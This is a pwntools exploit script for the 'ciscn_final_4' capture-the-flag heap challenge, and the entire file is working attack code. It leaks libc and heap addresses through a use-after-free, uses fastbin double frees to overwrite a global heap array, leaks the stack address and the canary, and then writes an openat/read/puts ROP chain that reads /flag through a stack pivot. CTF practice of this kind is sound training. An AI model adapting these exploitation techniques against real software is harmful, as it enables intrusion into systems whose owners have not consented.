from pwn import *

#context.log_level = 'debug'
p = process('./ciscn_final_4_hacked')
#p = remote('node4.buuoj.cn', 26714)
elf = ELF('./ciscn_final_4_hacked')
libc = ELF('libc-2.23.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(size, content):
    sla(b'>> ', b'1')
    sla(b'size?', str(size).encode())
    sa(b'content?', content)

def show(index):
    sla(b'>> ', b'3')
    sla(b'index ?', str(index).encode())

def delete(index):
    sla(b'>> ', b'2')
    sla(b'index ?', str(index).encode())

sa(b'name?', b'Yeuoy')

alloc(0xa0, b'a') #0
alloc(0x78, b'a') #1
alloc(0x78, b'a') #2
alloc(0x30, b'a') #3
alloc(0x30, b'a') #4
alloc(0x78, b'a') #5
alloc(0x81, b'a') #6
delete(0)

show(0) #leak libc

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
environ = libc_base + libc.sym['__environ']

success('libc_base -> {}'.format(hex(libc_base)))
success('stack_ptr -> {}'.format(hex(environ)))

delete(1)
delete(2)
delete(1)

show(1)
ru(b'\n')
heap_base = u64(ru(b'\n')[:-1].ljust(8, b'\x00')) - 0x130
success('heap_base -> {}'.format(hex(heap_base)))

heaparray = 0x6020c0

alloc(0x78, p64(heaparray - 0x70)) #0
alloc(0x78, b'a') #1
alloc(0x78, b'a') #2

alloc(0x78, b'a' * 0x60 + p64(environ)) #hijack heaparray[0] = environ

show(0)
stack = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
success('stack -> {}'.format(hex(stack)))

delete(1)
delete(2)
delete(1)

canary_addr = stack - 0x100
alloc(0x78, p64(heaparray - 0x70)) #0
alloc(0x78, b'a') #1
alloc(0x78, b'a') #2

alloc(0x78, b'a' * 0x60 + p64(canary_addr + 1)) #hijack heaparray[0] = canary
show(0)

ru(b'\n')
canary = u64(b'\x00' + rv(7))
success('canary -> {}'.format(hex(canary)))

pop_rdi_ret = 0x401193
leave_ret = 0x400b91
pop_rsi_ret = libc_base + 0x202e8
pop_rdx_ret = libc_base + 0x1b92
puts = libc_base + libc.sym['puts']
openat = libc_base + libc.sym['openat']
read = libc_base + libc.sym['read']

payload = b'/flag'.ljust(8, b'\x00') 
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(heap_base + 0x10)
payload += p64(pop_rdx_ret) + p64(0) + p64(openat)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(heap_base + 0x100)
payload += p64(pop_rdx_ret) + p64(0x40) + p64(read)
payload += p64(pop_rdi_ret) + p64(heap_base + 0x100) + p64(puts)
alloc(0xa0, payload)

delete(3)
delete(4)
delete(3)

alloc(0x30, p64(stack - 0x240 - 6))
alloc(0x30, b'\x00')
alloc(0x30, b'\x00')
alloc(0x30, 6 * b'\x00' + p64(canary) + p64(heap_base + 0x10) + p64(leave_ret))

p.interactive()